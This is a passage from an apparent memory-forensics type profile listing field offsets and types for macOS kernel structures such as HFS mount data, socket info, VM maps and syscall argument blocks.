    'hfs_extents_cp': [0x68, ['pointer', ['cnode']]],
    'hfs_catalog_cp': [0x70, ['pointer', ['cnode']]],
    'hfs_allocation_cp': [0x78, ['pointer', ['cnode']]],
    'hfs_attribute_cp': [0x80, ['pointer', ['cnode']]],
    'hfs_startup_cp': [0x88, ['pointer', ['cnode']]],
    'hfs_raw_dev': [0x90, ['int']],
    'hfs_logBlockSize': [0x94, ['unsigned int']],
    'hfs_uid': [0x98, ['unsigned int']],
    'hfs_gid': [0x9c, ['unsigned int']],
    'hfs_dir_mask': [0xa0, ['unsigned short']],
    'hfs_file_mask': [0xa2, ['unsigned short']],
    'hfs_encoding': [0xa4, ['unsigned int']],
    'hfs_mtime': [0xa8, ['long']],
    'hfs_filecount': [0xb0, ['unsigned int']],
    'hfs_dircount': [0xb4, ['unsigned int']],
    'freeBlocks': [0xb8, ['unsigned int']],
    'nextAllocation': [0xbc, ['unsigned int']],
    'sparseAllocation': [0xc0, ['unsigned int']],
    'vcbNxtCNID': [0xc4, ['unsigned int']],
    'vcbWrCnt': [0xc8, ['unsigned int']],
    'encodingsBitmap': [0xd0, ['unsigned long long']],
    'vcbNmFls': [0xd8, ['unsigned short']],
    'vcbNmRtDirs': [0xda, ['unsigned short']],
    'vcbSigWord': [0xdc, ['unsigned short']],
    'vcbFlags': [0xde, ['short']],
    'vcbAtrb': [0xe0, ['unsigned int']],
    'vcbJinfoBlock': [0xe4, ['unsigned int']],
    'localCreateDate': [0xe8, ['unsigned int']],
    'hfs_itime': [0xf0, ['long']],
    'hfs_btime': [0xf8, ['long']],
    'blockSize': [0x100, ['unsigned int']],
    'totalBlocks': [0x104, ['unsigned int']],
    'allocLimit': [0x108, ['unsigned int']],
    'vcbClpSiz': [0x10c, ['int']],
    'vcbFndrInfo': [0x110, ['array', 8, ['unsigned int']]],
    'vcbVBMSt': [0x130, ['short']],
    'vcbAlBlSt': [0x132, ['short']],
    'vcbVN': [0x134, ['array', 256, ['unsigned char']]],
    'volumeNameEncodingHint': [0x234, ['unsigned int']],
    'hfsPlusIOPosOffset': [0x238, ['unsigned int']],
    'vcbVBMIOSize': [0x23c, ['unsigned int']],
    'vcbFreeExtCnt': [0x240, ['unsigned int']],
    'vcbFreeExt': [0x244, ['array', 10, ['HFSPlusExtentDescriptor']]],
    'vcbFreeExtLock': [0x298, ['__unnamed_10525361']],
    'hfs_summary_table': [0x2e8, ['pointer', ['unsigned char']]],
    'hfs_summary_size': [0x2f0, ['unsigned int']],
    'hfs_summary_bytes': [0x2f4, ['unsigned int']],
    'scan_var': [0x2f8, ['unsigned int']],
    'reserveBlocks': [0x2fc, ['unsigned int']],
    'loanedBlocks': [0x300, ['unsigned int']],
    'hfs_private_desc': [0x308, ['array', 2, ['cat_desc']]],
    'hfs_private_attr': [0x338, ['array', 2, ['cat_attr']]],
    'hfs_metadata_createdate': [0x428, ['unsigned int']],
    'hfs_get_unicode': [0x430, ['pointer', ['void']]],
    'hfs_get_hfsname': [0x438, ['pointer', ['void']]],
    'hfs_qfiles': [0x440, ['array', 2, ['quotafile']]],
    'jnl': [0x4c0, ['pointer', ['void']]],
    'jvp': [0x4c8, ['pointer', ['vnode']]],
    'jnl_start': [0x4d0, ['unsigned int']],
    'jnl_size': [0x4d4, ['unsigned int']],
    'hfs_jnlfileid': [0x4d8, ['unsigned int']],
    'hfs_jnlinfoblkid': [0x4dc, ['unsigned int']],
    'hfs_global_lock': [0x4e0, ['__unnamed_10546857']],
    'hfs_global_lock_nesting': [0x4f0, ['unsigned int']],
    'hfs_global_lockowner': [0x4f8, ['pointer', ['void']]],
    'hfs_notification_conditions': [0x500, ['unsigned int']],
    'hfs_freespace_notify_dangerlimit': [0x504, ['unsigned int']],
    'hfs_freespace_notify_warninglimit': [0x508, ['unsigned int']],
    'hfs_freespace_notify_desiredlevel': [0x50c, ['unsigned int']],
    'hfs_mount_time': [0x510, ['long']],
    'hfs_last_mounted_mtime': [0x518, ['long']],
    'hfs_metazone_start': [0x520, ['unsigned int']],
    'hfs_metazone_end': [0x524, ['unsigned int']],
    'hfs_hotfile_start': [0x528, ['unsigned int']],
    'hfs_hotfile_end': [0x52c, ['unsigned int']],
    'hfs_min_alloc_start': [0x530, ['unsigned int']],
    'hfs_freed_block_count': [0x534, ['unsigned int']],
    'hfs_hotfile_freeblks': [0x538, ['int']],
    'hfs_hotfile_maxblks': [0x53c, ['int']],
    'hfs_overflow_maxblks': [0x540, ['int']],
    'hfs_catalog_maxblks': [0x544, ['int']],
    'hfc_mutex': [0x548, ['__unnamed_10524584']],
    'hfc_stage': [0x558, ['Enumeration', {'target': 'int', 'choices': {0: 'HFC_DISABLED', 1: 'HFC_IDLE', 2: 'HFC_BUSY', 3: 'HFC_RECORDING', 4: 'HFC_EVALUATION', 5: 'HFC_EVICTION', 6: 'HFC_ADOPTION'}}]],
    'hfc_timebase': [0x560, ['long']],
    'hfc_timeout': [0x568, ['long']],
    'hfc_recdata': [0x570, ['pointer', ['void']]],
    'hfc_maxfiles': [0x578, ['int']],
    'hfc_filevp': [0x580, ['pointer', ['vnode']]],
    'hfs_backingfs_rootvp': [0x588, ['pointer', ['vnode']]],
    'hfs_last_backingstatfs': [0x590, ['unsigned int']],
    'hfs_sparsebandblks': [0x594, ['int']],
    'hfs_backingfs_maxblocks': [0x598, ['unsigned long long']],
    'hfs_max_inline_attrsize': [0x5a0, ['unsigned long']],
    'hfs_mutex': [0x5a8, ['__unnamed_10524584']],
    'hfs_freezing_proc': [0x5b8, ['pointer', ['void']]],
    'hfs_downgrading_proc': [0x5c0, ['pointer', ['void']]],
    'hfs_insync': [0x5c8, ['__unnamed_10546857']],
    'hfs_resize_blocksmoved': [0x5d8, ['unsigned int']],
    'hfs_resize_totalblocks': [0x5dc, ['unsigned int']],
    'hfs_resize_progress': [0x5e0, ['unsigned int']],
    'hfs_chash_mutex': [0x5e8, ['__unnamed_10524584']],
    'hfs_cnodehash': [0x5f8, ['unsigned long']],
    'hfs_cnodehashtbl': [0x600, ['pointer', ['cnodehashhead']]],
    'hfs_idhash': [0x608, ['unsigned long']],
    'hfs_idhashtbl': [0x610, ['pointer', ['idhashhead']]],
    'hfs_sync_req_oldest': [0x618, ['timeval']],
    'hfs_sync_incomplete': [0x628, ['int']],
    'hfs_syncer': [0x630, ['pointer', ['thread_call']]],
    'hfs_syncer_thread': [0x638, ['pointer', ['thread']]],
    'hfs_active_threads': [0x640, ['unsigned int']],
}],
  'in_sockinfo': [ 0x50, {
    'insi_fport': [0x0, ['int']],
    'insi_lport': [0x4, ['int']],
    'insi_gencnt': [0x8, ['unsigned long long']],
    'insi_flags': [0x10, ['unsigned int']],
    'insi_flow': [0x14, ['unsigned int']],
    'insi_vflag': [0x18, ['unsigned char']],
    'insi_ip_ttl': [0x19, ['unsigned char']],
    'rfu_1': [0x1c, ['unsigned int']],
    'insi_faddr': [0x20, ['__unnamed_12506453']],
    'insi_laddr': [0x30, ['__unnamed_12506507']],
    'insi_v4': [0x40, ['__unnamed_12506561']],
    'insi_v6': [0x44, ['__unnamed_12506599']],
}],
  'scattered_relocation_info': [ 0x8, {
    'r_pcrel': [0x0, ['BitField', {'end_bit': 31, 'start_bit': 30}]],
    'r_scattered': [0x0, ['BitField', {'end_bit': 32, 'start_bit': 31}]],
    'r_type': [0x0, ['BitField', {'end_bit': 28, 'start_bit': 24}]],
    'r_length': [0x0, ['BitField', {'end_bit': 30, 'start_bit': 28}]],
    'r_address': [0x0, ['BitField', {'end_bit': 24, 'start_bit': 0}]],
    'r_value': [0x4, ['int']],
}],
  '__unnamed_9399748': [ 0x30, {
    '_dn_ro6': [0x0, ['route_in6']],
    '_dn_ro': [0x0, ['route']],
}],
  'c_segu': [ 0x8, {
    'c_seg': [0x0, ['pointer', ['c_segment']]],
    'c_segno': [0x0, ['unsigned int']],
}],
  '__unnamed_11030303': [ 0x10, {
    'tqe_next': [0x0, ['pointer', ['kauth_group_membership']]],
    'tqe_prev': [0x8, ['pointer', ['pointer', ['kauth_group_membership']]]],
}],
  'write_args': [ 0x18, {
    'fd_l_': [0x0, ['array', 0, ['char']]],
    'fd': [0x0, ['int']],
    'fd_r_': [0x4, ['array', 4, ['char']]],
    'cbuf_l_': [0x8, ['array', 0, ['char']]],
    'cbuf': [0x8, ['unsigned long long']],
    'nbyte_l_': [0x10, ['array', 0, ['char']]],
    'cbuf_r_': [0x10, ['array', 0, ['char']]],
    'nbyte': [0x10, ['unsigned long long']],
    'nbyte_r_': [0x18, ['array', 0, ['char']]],
}],
  'rt_msghdr': [ 0x5c, {
    'rtm_msglen': [0x0, ['unsigned short']],
    'rtm_version': [0x2, ['unsigned char']],
    'rtm_type': [0x3, ['unsigned char']],
    'rtm_index': [0x4, ['unsigned short']],
    'rtm_flags': [0x8, ['int']],
    'rtm_addrs': [0xc, ['int']],
    'rtm_pid': [0x10, ['int']],
    'rtm_seq': [0x14, ['int']],
    'rtm_errno': [0x18, ['int']],
    'rtm_use': [0x1c, ['int']],
    'rtm_inits': [0x20, ['unsigned int']],
    'rtm_rmx': [0x24, ['rt_metrics']],
}],
  '__unnamed_5241796': [ 0x660, {
    'enc': [0x0, ['array', 51, ['__unnamed_5241676']]],
    'dec': [0x330, ['array', 51, ['__unnamed_5241676']]],
}],
  '_kernelrpc_mach_vm_allocate_trap_args': [ 0x20, {
    'target': [0x0, ['unsigned int']],
    'target_l_': [0x0, ['array', 0, ['char']]],
    'target_r_': [0x4, ['array', 4, ['char']]],
    'addr_l_': [0x8, ['array', 0, ['char']]],
    'addr': [0x8, ['unsigned long long']],
    'addr_r_': [0x10, ['array', 0, ['char']]],
    'size': [0x10, ['unsigned long long']],
    'size_l_': [0x10, ['array', 0, ['char']]],
    'size_r_': [0x18, ['array', 0, ['char']]],
    'flags_l_': [0x18, ['array', 0, ['char']]],
    'flags': [0x18, ['int']],
    'flags_r_': [0x1c, ['array', 4, ['char']]],
}],
  '__unnamed_12509298': [ 0x10, {
    'tqe_next': [0x0, ['pointer', ['ndrv_cb']]],
    'tqe_prev': [0x8, ['pointer', ['pointer', ['ndrv_cb']]]],
}],
  'psemname': [ 0x18, {
    'psem_nameptr': [0x0, ['pointer', ['char']]],
    'psem_namelen': [0x8, ['long']],
    'psem_hash': [0x10, ['unsigned int']],
}],
  '__unnamed_7510865': [ 0x10, {
    'tqe_next': [0x0, ['pointer', ['pf_state']]],
    'tqe_prev': [0x8, ['pointer', ['pointer', ['pf_state']]]],
}],
  'ipsec_mtag': [ 0x4, {
    'policy_id': [0x0, ['unsigned int']],
}],
  'mach_gss_init_sec_contextMessU': [ 0x870, {
    'Out': [0x0, ['__unnamed_129398']],
    'In': [0x0, ['__unnamed_129119']],
}],
  'dof_probedesc': [ 0x18, {
    'dofp_strtab': [0x0, ['unsigned int']],
    'dofp_provider': [0x4, ['unsigned int']],
    'dofp_mod': [0x8, ['unsigned int']],
    'dofp_func': [0xc, ['unsigned int']],
    'dofp_name': [0x10, ['unsigned int']],
    'dofp_id': [0x14, ['unsigned int']],
}],
  '__unnamed_17153850': [ 0x10, {
    'tqh_first': [0x0, ['pointer', ['aio_workq_entry']]],
    'tqh_last': [0x8, ['pointer', ['pointer', ['aio_workq_entry']]]],
}],
  '__unnamed_12887168': [ 0x10, {
    'tcp': [0x0, ['tcp_mtag']],
    'ipsec': [0x0, ['ipsec_mtag']],
}],
  '__unnamed_9988759': [ 0x10, {
    'le_next': [0x0, ['pointer', ['secasvar']]],
    'le_prev': [0x8, ['pointer', ['pointer', ['secasvar']]]],
}],
  'IOPMPowerSource_class': [ 0x138, {
    'metaClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    'gMetaClass': [0x0, ['MetaClass_class']],
    'superClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    'settingsChangedSinceUpdate': [0x88, ['int']],
    'properties': [0x90, ['pointer', ['OSDictionary_class']]],
    'externalConnectedKey': [0x98, ['pointer', ['OSSymbol_class']]],
    'externalChargeCapableKey': [0xa0, ['pointer', ['OSSymbol_class']]],
    'batteryInstalledKey': [0xa8, ['pointer', ['OSSymbol_class']]],
    'chargingKey': [0xb0, ['pointer', ['OSSymbol_class']]],
    'warnLevelKey': [0xb8, ['pointer', ['OSSymbol_class']]],
    'criticalLevelKey': [0xc0, ['pointer', ['OSSymbol_class']]],
    'currentCapacityKey': [0xc8, ['pointer', ['OSSymbol_class']]],
    'maxCapacityKey': [0xd0, ['pointer', ['OSSymbol_class']]],
    'timeRemainingKey': [0xd8, ['pointer', ['OSSymbol_class']]],
    'amperageKey': [0xe0, ['pointer', ['OSSymbol_class']]],
    'voltageKey': [0xe8, ['pointer', ['OSSymbol_class']]],
    'cycleCountKey': [0xf0, ['pointer', ['OSSymbol_class']]],
    'adapterInfoKey': [0xf8, ['pointer', ['OSSymbol_class']]],
    'locationKey': [0x100, ['pointer', ['OSSymbol_class']]],
    'errorConditionKey': [0x108, ['pointer', ['OSSymbol_class']]],
    'manufacturerKey': [0x110, ['pointer', ['OSSymbol_class']]],
    'modelKey': [0x118, ['pointer', ['OSSymbol_class']]],
    'serialKey': [0x120, ['pointer', ['OSSymbol_class']]],
    'batteryInfoKey': [0x128, ['pointer', ['OSSymbol_class']]],
    'nextInList': [0x130, ['pointer', ['IOPMPowerSource_class']]],
}],
  'vfstable': [ 0x58, {
    'vfc_vfsops': [0x0, ['pointer', ['vfsops']]],
    'vfc_name': [0x8, ['array', 15, ['char']]],
    'vfc_typenum': [0x18, ['int']],
    'vfc_refcount': [0x1c, ['int']],
    'vfc_flags': [0x20, ['int']],
    'vfc_mountroot': [0x28, ['pointer', ['void']]],
    'vfc_next': [0x30, ['pointer', ['vfstable']]],
    'vfc_reserved1': [0x38, ['int']],
    'vfc_reserved2': [0x3c, ['int']],
    'vfc_vfsflags': [0x40, ['int']],
    'vfc_descptr': [0x48, ['pointer', ['void']]],
    'vfc_descsize': [0x50, ['int']],
}],
  'proc_rlimit_control_args': [ 0x18, {
    'pid': [0x0, ['int']],
    'pid_l_': [0x0, ['array', 0, ['char']]],
    'pid_r_': [0x4, ['array', 4, ['char']]],
    'flavor_l_': [0x8, ['array', 0, ['char']]],
    'flavor': [0x8, ['int']],
    'flavor_r_': [0xc, ['array', 4, ['char']]],
    'arg': [0x10, ['unsigned long long']],
    'arg_l_': [0x10, ['array', 0, ['char']]],
    'arg_r_': [0x18, ['array', 0, ['char']]],
}],
  'sesshashhead': [ 0x8, {
    'lh_first': [0x0, ['pointer', ['session']]],
}],
  'auditpipe_ioctl_preselect': [ 0xc, {
    'aip_auid': [0x0, ['unsigned int']],
    'aip_mask': [0x4, ['au_mask']],
}],
  'getrusage_args': [ 0x10, {
    'who': [0x0, ['int']],
    'who_l_': [0x0, ['array', 0, ['char']]],
    'who_r_': [0x4, ['array', 4, ['char']]],
    'rusage_l_': [0x8, ['array', 0, ['char']]],
    'rusage': [0x8, ['unsigned long long']],
    'rusage_r_': [0x10, ['array', 0, ['char']]],
}],
  'if_qstatsreq': [ 0x28, {
    'ifqr_name': [0x0, ['array', 16, ['char']]],
    'ifqr_slot': [0x10, ['unsigned int']],
    'ifqr_buf': [0x18, ['pointer', ['void']]],
    'ifqr_len': [0x20, ['int']],
}],
  'sockbuf_info': [ 0x18, {
    'sbi_cc': [0x0, ['unsigned int']],
    'sbi_hiwat': [0x4, ['unsigned int']],
    'sbi_mbcnt': [0x8, ['unsigned int']],
    'sbi_mbmax': [0xc, ['unsigned int']],
    'sbi_lowat': [0x10, ['unsigned int']],
    'sbi_flags': [0x14, ['short']],
    'sbi_timeo': [0x16, ['short']],
}],
  '_vm_map': [ 0xf0, {
    'lock': [0x0, ['_lck_rw_t_internal_']],
    'hdr': [0x10, ['vm_map_header']],
    'pmap': [0x50, ['pointer', ['pmap']]],
    'size': [0x58, ['unsigned long long']],
    'user_wire_limit': [0x60, ['unsigned long long']],
    'user_wire_size': [0x68, ['unsigned long long']],
    'ref_count': [0x70, ['int']],
    's_lock': [0x78, ['_lck_mtx_']],
    's_lock_ext': [0x88, ['_lck_mtx_ext_']],
    'hint': [0xd0, ['pointer', ['vm_map_entry']]],
    'first_free': [0xd8, ['pointer', ['vm_map_entry']]],
    'mapped_in_other_pmaps': [0xe0, ['BitField', {'end_bit': 4, 'start_bit': 3}]],
    'map_disallow_data_exec': [0xe0, ['BitField', {'end_bit': 7, 'start_bit': 6}]],
    'no_zero_fill': [0xe0, ['BitField', {'end_bit': 3, 'start_bit': 2}]],
    'pad': [0xe0, ['BitField', {'end_bit': 32, 'start_bit': 7}]],
    'wiring_required': [0xe0, ['BitField', {'end_bit': 2, 'start_bit': 1}]],
    'wait_for_space': [0xe0, ['BitField', {'end_bit': 1, 'start_bit': 0}]],
    'switch_protect': [0xe0, ['BitField', {'end_bit': 5, 'start_bit': 4}]],
    'disable_vmentry_reuse': [0xe0, ['BitField', {'end_bit': 6, 'start_bit': 5}]],
    'timestamp': [0xe4, ['unsigned int']],
    'color_rr': [0xe8, ['unsigned int']],
    'jit_entry_exists': [0xec, ['int']],
}],
  'secpolicyindex': [ 0x318, {
    'dir': [0x0, ['unsigned char']],
    'src': [0x8, ['sockaddr_storage']],
    'dst': [0x88, ['sockaddr_storage']],
    'prefs': [0x108, ['unsigned char']],
    'prefd': [0x109, ['unsigned char']],
    'ul_proto': [0x10a, ['unsigned short']],
    'internal_if': [0x110, ['pointer', ['ifnet']]],
    'src_range': [0x118, ['secpolicyaddrrange']],
    'dst_range': [0x218, ['secpolicyaddrrange']],
}],
  'InsertKey': [ 0x18, {
    'keyPtr': [0x0, ['pointer', ['BTreeKey']]],
    'recPtr': [0x8, ['pointer', ['unsigned char']]],
    'keyLength': [0x10, ['unsigned short']],
    'recSize': [0x12, ['unsigned short']],
    'replacingKey': [0x14, ['unsigned char']],
    'skipRotate': [0x15, ['unsigned char']],
}],
  'action': [ 0xc, {
    'sample': [0x0, ['unsigned int']],
    'userdata': [0x4, ['unsigned int']],
    'pid_filter': [0x8, ['int']],
}],
  'ipfw_dyn_rule_compat_64': [ 0x50, {
    'next': [0x0, ['unsigned long long']],
    'id': [0x8, ['ipfw_flow_id']],
    'mask': [0x18, ['ipfw_flow_id']],
    'chain': [0x28, ['unsigned long long']],
    'type': [0x30, ['unsigned int']],
    'expire': [0x34, ['unsigned int']],
    'pcnt': [0x38, ['unsigned long long']],
    'bcnt': [0x40, ['unsigned long long']],
    'bucket': [0x48, ['unsigned int']],
    'state': [0x4c, ['unsigned int']],
}],
  'omb_stat': [ 0x88, {
    'mbs_cnt': [0x0, ['unsigned int']],
    'mbs_class': [0x4, ['array', 1, ['omb_class_stat']]],
}],
  '__unnamed_12211222': [ 0x100, {
    'xu_dummy1': [0x0, ['array', 256, ['char']]],
    'xuu_addr': [0x0, ['sockaddr_un']],
}],
  'shm_open_args': [ 0x18, {
    'name': [0x0, ['unsigned long long']],
    'name_l_': [0x0, ['array', 0, ['char']]],
    'oflag': [0x8, ['int']],
    'name_r_': [0x8, ['array', 0, ['char']]],
    'oflag_l_': [0x8, ['array', 0, ['char']]],
    'oflag_r_': [0xc, ['array', 4, ['char']]],
    'mode_l_': [0x10, ['array', 0, ['char']]],
    'mode': [0x10, ['int']],
    'mode_r_': [0x14, ['array', 4, ['char']]],
}],
  'user_uprof': [ 0x38, {
    'pr_next': [0x0, ['pointer', ['user_uprof']]],
    'pr_base': [0x8, ['unsigned long long']],
    'pr_size': [0x10, ['unsigned long long']],
    'pr_off': [0x18, ['unsigned long long']],
    'pr_scale': [0x20, ['unsigned long long']],
    'pr_addr': [0x28, ['unsigned long long']],
    'pr_ticks': [0x30, ['unsigned long long']],
}],
  'processor_set': [ 0x8a0, {
    'active_queue': [0x0, ['queue_entry']],
    'idle_queue': [0x10, ['queue_entry']],
    'low_pri': [0x20, ['pointer', ['processor']]],
    'low_count': [0x28, ['pointer', ['processor']]],
    'online_processor_count': [0x30, ['int']],
    'cpu_set_low': [0x34, ['int']],
    'cpu_set_hi': [0x38, ['int']],
    'cpu_set_count': [0x3c, ['int']],
    'sched_lock': [0x40, ['slock']],
    'pset_runq': [0x48, ['run_queue']],
    'pset_runq_bound_count': [0x878, ['int']],
    'pending_AST_cpu_mask': [0x87c, ['unsigned int']],
    'pset_self': [0x880, ['pointer', ['ipc_port']]],
    'pset_name_self': [0x888, ['pointer', ['ipc_port']]],
    'pset_list': [0x890, ['pointer', ['processor_set']]],
    'node': [0x898, ['pointer', ['pset_node']]],
}],
  'gettimeofday_args': [ 0x10, {
    'tp_l_': [0x0, ['array', 0, ['char']]],
    'tp': [0x0, ['unsigned long long']],
    'tzp': [0x8, ['unsigned long long']],
    'tzp_l_': [0x8, ['array', 0, ['char']]],
    'tp_r_': [0x8, ['array', 0, ['char']]],
    'tzp_r_': [0x10, ['array', 0, ['char']]],
}],
  'DriverCallParam': [ 0x10, {
    'Target': [0x0, ['pointer', ['OSObject_class']]],
    'Result': [0x8, ['int']],
}],
  'ip6_hbh': [ 0x2, {
    'ip6h_nxt': [0x0, ['unsigned char']],
    'ip6h_len': [0x1, ['unsigned char']],
}],
  'kdp_manual_pkt': [ 0x88, {
    'data': [0x0, ['array', 128, ['unsigned char']]],
    'len': [0x80, ['unsigned int']],
    'input': [0x84, ['int']],
}],
  'kxld_vtable_unpatched_entry': [ 0x10, {
    'sym': [0x0, ['pointer', ['kxld_sym']]],
    'reloc': [0x8, ['pointer', ['kxld_reloc']]],
}],
  '__unnamed_100176': [ 0x8, {
    'vsu_imap': [0x0, ['pointer', ['pointer', ['vs_map']]]],
    'vsu_dmap': [0x0, ['pointer', ['vs_map']]],
}],
  'OSBoolean_class': [ 0x10, {
    'gMetaClass': [0x0, ['MetaClass_class']],
    'metaClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    'superClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    'value': [0xc, ['int']],
}],
  'IMIGNotifyObjectVtbl': [ 0x38, {
    'QueryInterface': [0x0, ['pointer', ['void']]],
    'AddRef': [0x8, ['pointer', ['void']]],
    'Release': [0x10, ['pointer', ['void']]],
    'GetServer': [0x18, ['pointer', ['void']]],
    'RaiseNotification': [0x20, ['pointer', ['void']]],
    'RequestNotification': [0x28, ['pointer', ['void']]],
    'HandleNotification': [0x30, ['pointer', ['void']]],
}],
  '__unnamed_8078487': [ 0x10, {
    'opaque': [0x0, ['array', 2, ['unsigned long']]],
}],
  'nfs_specdata': [ 0x8, {
    'specdata1': [0x0, ['unsigned int']],
    'specdata2': [0x4, ['unsigned int']],
}],
  '__unnamed_10547256': [ 0x10, {
    'le_next': [0x0, ['pointer', ['dquot']]],
    'le_prev': [0x8, ['pointer', ['pointer', ['dquot']]]],
}],
  'IOExternalMethodDispatch': [ 0x18, {
    'function': [0x0, ['pointer', ['void']]],
    'checkScalarInputCount': [0x8, ['unsigned int']],
    'checkStructureInputSize': [0xc, ['unsigned int']],
    'checkScalarOutputCount': [0x10, ['unsigned int']],
    'checkStructureOutputSize': [0x14, ['unsigned int']],
}],
  'user32_kinfo_proc': [ 0x1ec, {
    'kp_proc': [0x0, ['user32_extern_proc']],
    'kp_eproc': [0xc4, ['user32_eproc']],
}],
  'HFSPlusForkData': [ 0x50, {
    'logicalSize': [0x0, ['unsigned long long']],
    'clumpSize': [0x8, ['unsigned int']],
    'totalBlocks': [0xc, ['unsigned int']],
    'extents': [0x10, ['array', 8, ['HFSPlusExtentDescriptor']]],
}],
  '__mac_getfsstat_args': [ 0x28, {
    'buf_l_': [0x0, ['array', 0, ['char']]],
    'buf': [0x0, ['unsigned long long']],
    'buf_r_': [0x8, ['array', 0, ['char']]],
    'bufsize_l_': [0x8, ['array', 0, ['char']]],
    'bufsize': [0x8, ['int']],
    'bufsize_r_': [0xc, ['array', 4, ['char']]],
    'mac_l_': [0x10, ['array', 0, ['char']]],
    'mac': [0x10, ['unsigned long long']],
    'mac_r_': [0x18, ['array', 0, ['char']]],
    'macsize_l_': [0x18, ['array', 0, ['char']]],
    'macsize': [0x18, ['int']],
    'macsize_r_': [0x1c, ['array', 4, ['char']]],
    'flags_l_': [0x20, ['array', 0, ['char']]],
    'flags': [0x20, ['int']],
    'flags_r_': [0x24, ['array', 4, ['char']]],
}],
  '__unnamed_13364874': [ 0x8, {
    'ccn': [0x0, ['unsigned long long']],
    'u64': [0x0, ['unsigned long long']],
    'u8': [0x0, ['unsigned char']],
    'u32': [0x0, ['unsigned int']],
}],
  'setregid_args': [ 0x10, {
    'rgid': [0x0, ['unsigned int']],
    'rgid_l_': [0x0, ['array', 0, ['char']]],
    'rgid_r_': [0x4, ['array', 4, ['char']]],
    'egid': [0x8, ['unsigned int']],
    'egid_l_': [0x8, ['array', 0, ['char']]],
    'egid_r_': [0xc, ['array', 4, ['char']]],
}],
  'nd_router_solicit': [ 0x8, {
    'nd_rs_hdr': [0x0, ['icmp6_hdr']],
}],
  'dadq': [ 0x48, {
    'dad_lock': [0x0, ['__unnamed_9679129']],
    'dad_refcount': [0x10, ['unsigned int']],
    'dad_attached': [0x14, ['int']],
    'dad_list': [0x18, ['__unnamed_9697826']],
    'dad_ifa': [0x28, ['pointer', ['ifaddr']]],
    'dad_count': [0x30, ['int']],
    'dad_ns_tcount': [0x34, ['int']],
    'dad_ns_ocount': [0x38, ['int']],
    'dad_ns_icount': [0x3c, ['int']],
    'dad_na_icount': [0x40, ['int']],
    'dad_nd_ixcount': [0x44, ['int']],
}],
  'if_ifclassq_stats': [ 0x3d8, {
    'ifqs_len': [0x0, ['unsigned int']],
    'ifqs_maxlen': [0x4, ['unsigned int']],
    'ifqs_xmitcnt': [0x8, ['pktcntr']],
    'ifqs_dropcnt': [0x18, ['pktcntr']],
    'ifqs_scheduler': [0x28, ['unsigned int']],
    '__unnamed_7807812': [0x30, ['__unnamed_7807716']],
}],
  'mac_label_element': [ 0x38, {
    'mle_name': [0x0, ['array', 32, ['char']]],
    'mle_listeners': [0x20, ['mac_label_listeners_t']],
    'mle_list': [0x28, ['__unnamed_16628450']],
}],
  '__unnamed_5406983': [ 0x10, {
    'key': [0x0, ['unsigned long long']],
    'lbn': [0x8, ['unsigned long long']],
}],
  '__unnamed_17148386': [ 0x10, {
    'tqe_next': [0x0, ['pointer', ['eventqelt']]],
    'tqe_prev': [0x8, ['pointer', ['pointer', ['eventqelt']]]],
}],
  'IOPMRequestQueue_class': [ 0x60, {
    'gMetaClass': [0x0, ['MetaClass_class']],
    'metaClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    'superClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    'fQueue': [0x48, ['queue_entry']],
    'fLock': [0x58, ['pointer', ['__unnamed_16327073']]],
}],
  'ip6protosw': [ 0x98, {
    'pr_entry': [0x0, ['__unnamed_9586240']],
    'pr_domain': [0x10, ['pointer', ['domain']]],
    'pr_protosw': [0x18, ['pointer', ['protosw']]],
    'pr_type': [0x20, ['unsigned short']],
    'pr_protocol': [0x22, ['unsigned short']],
    'pr_flags': [0x24, ['unsigned int']],
    'pr_input': [0x28, ['pointer', ['void']]],
    'pr_output': [0x30, ['pointer', ['void']]],
    'pr_ctlinput': [0x38, ['pointer', ['void']]],
    'pr_ctloutput': [0x40, ['pointer', ['void']]],
    'pr_usrreqs': [0x48, ['pointer', ['pr_usrreqs']]],
    'pr_init': [0x50, ['pointer', ['void']]],
    'pr_drain': [0x58, ['pointer', ['void']]],
    'pr_sysctl': [0x60, ['pointer', ['void']]],
    'pr_lock': [0x68, ['pointer', ['void']]],
    'pr_unlock': [0x70, ['pointer', ['void']]],
    'pr_getlock': [0x78, ['pointer', ['void']]],
    'pr_filter_head': [0x80, ['__unnamed_9586530']],
    'pr_old': [0x90, ['pointer', ['protosw_old']]],
}],
  'write_nocancel_args': [ 0x18, {
    'fd_l_': [0x0, ['array', 0, ['char']]],
    'fd': [0x0, ['int']],
    'fd_r_': [0x4, ['array', 4, ['char']]],
    'cbuf_l_': [0x8, ['array', 0, ['char']]],
    'cbuf': [0x8, ['unsigned long long']],
    'nbyte_l_': [0x10, ['array', 0, ['char']]],
    'cbuf_r_': [0x10, ['array', 0, ['char']]],
    'nbyte': [0x10, ['unsigned long long']],
    'nbyte_r_': [0x18, ['array', 0, ['char']]],
}],
  'igmpstat_v3': [ 0xa8, {
    'igps_version': [0x0, ['unsigned int']],
    'igps_len': [0x4, ['unsigned int']],
    'igps_rcv_total': [0x8, ['unsigned long long']],
    'igps_rcv_tooshort': [0x10, ['unsigned long long']],
    'igps_rcv_badttl': [0x18, ['unsigned long long']],
    'igps_rcv_badsum': [0x20, ['unsigned long long']],
    'igps_rcv_v1v2_queries': [0x28, ['unsigned long long']],
    'igps_rcv_v3_queries': [0x30, ['unsigned long long']],
    'igps_rcv_badqueries': [0x38, ['unsigned long long']],
    'igps_rcv_gen_queries': [0x40, ['unsigned long long']],
    'igps_rcv_group_queries': [0x48, ['unsigned long long']],
    'igps_rcv_gsr_queries': [0x50, ['unsigned long long']],
    'igps_drop_gsr_queries': [0x58, ['unsigned long long']],
    'igps_rcv_reports': [0x60, ['unsigned long long']],
    'igps_rcv_badreports': [0x68, ['unsigned long long']],
    'igps_rcv_ourreports': [0x70, ['unsigned long long']],
    'igps_rcv_nora': [0x78, ['unsigned long long']],
    'igps_snd_reports': [0x80, ['unsigned long long']],
    '__igps_pad': [0x88, ['array', 4, ['unsigned long long']]],
}],
  'bridge_control': [ 0x10, {
    'bc_func': [0x0, ['pointer', ['void']]],
    'bc_argsize': [0x8, ['unsigned int']],
    'bc_flags': [0xc, ['unsigned int']],
}],
  'proc_regionwithpathinfo': [ 0x4f8, {
    'prp_prinfo': [0x0, ['proc_regioninfo']],
    'prp_vip': [0x60, ['vnode_info_path']],
}],
  'user32_extern_proc': [ 0xc4, {
